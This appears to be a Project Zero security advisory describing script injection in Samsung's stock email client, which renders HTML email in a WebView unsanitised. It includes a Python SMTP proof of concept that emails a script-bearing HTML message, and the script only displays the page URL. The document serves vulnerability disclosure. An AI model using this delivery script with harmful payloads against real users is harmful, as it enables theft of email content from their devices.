# Source: https://code.google.com/p/google-security-research/issues/detail?id=494

'''
The default Samsung email client's email viewer and composer (implemented in SecEmailUI.apk) doesn't sanitize HTML email content for scripts before rendering the data inside a WebView. This allows an attacker to execute arbitrary JavaScript when a user views a HTML email which contains HTML script tags or other events.

At the very least the JavaScript could exploit the attack surface provided within the WebView control. It might also be possible to access local file content or emails depending on the full configuration of the WebView, although this hasn't been tested fully.

This can also be exploited locally with the com.samsung.android.email.intent.action.QUICK_REPLY_BACKGROUND intent which will include attacker controlled HTML in the sending email. If the final message was viewed it would be possible for the script to extract the original message from the Document object and potentially post that information to another server.

Attached is a simple SMTP client in Python to send an HTML message with script contents to the device. The "me", "you", "me_password" and "smtp_server" variables need to be changed to ones appropriate for the sending email account and the receiving account on the phone. When the resulting email is viewed it should display the URL of the page which is of the form email://M/N where M is the email account ID and N is the message ID which proves that the script code executed.
'''

#!/usr/bin/env python

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Change the details here appropriate to your configuration
me = "attacker@gmail.com"
me_password = "THIS IS NOT REAL"
you = "project.zero.test@gmail.com"
smtp_server = "smtp.gmail.com"

msg = MIMEMultipart('alternative')
msg['Subject'] = "Hello There!"
msg['From'] = me
msg['To'] = you

text = "Hello There!"
html = """\
<html>
  <head></head>
  <body>
   <p>
       <script>try { document.write(document.location); } catch(e) { document.write(e.message); }</script>
    </p>
  </body>
</html>
"""

part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')

msg.attach(part1)
msg.attach(part2)

s = smtplib.SMTP_SSL(smtp_server)
s.login(me, me_password)
s.sendmail(me, you, msg.as_string())
s.quit()